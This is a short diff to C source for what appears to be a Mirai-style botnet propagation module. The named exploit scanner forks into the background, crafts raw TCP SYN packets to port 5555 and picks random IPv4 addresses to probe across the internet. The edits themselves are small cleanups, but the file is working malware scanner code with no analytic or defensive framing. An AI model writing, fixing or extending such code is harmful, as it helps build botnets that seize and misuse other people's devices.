@@ -22,12 +22,10 @@
 #include <signal.h>
 #include <errno.h>
 #include <string.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
 
 int exploit_scanner_pid = 0, exploit_rsck = 0, exploit_rsck_out = 0;
 char exploit_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
-struct exploit_scanner_connection *conn_table;
+static struct exploit_scanner_connection *conn_table;
 uint32_t exploit_fake_time = 0;
 
 int exploit_recv_strip_null(int sock, void *buf, int len, int flags)
@@ -61,8 +59,6 @@ void exploit_init(void)
     exploit_scanner_pid = fork();
     if(exploit_scanner_pid > 0 || exploit_scanner_pid == -1)
         return;
-
-    LOCAL_ADDR = util_local_addr();
 
     rand_init();
     exploit_fake_time = time(NULL);
@@ -142,7 +138,7 @@ void exploit_init(void)
                 tcph->dest = htons(5555);
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
-                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
+                tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
 
                 paddr.sin_family = AF_INET;
                 paddr.sin_addr.s_addr = iph->daddr;
@@ -424,7 +420,6 @@ static ipv4_t get_random_ip(void)
     {
         tmp = rand_next();
 
-		srand(time(NULL));
         o1 = tmp & 0xff;
         o2 = (tmp >> 8) & 0xff;
         o3 = (tmp >> 16) & 0xff;
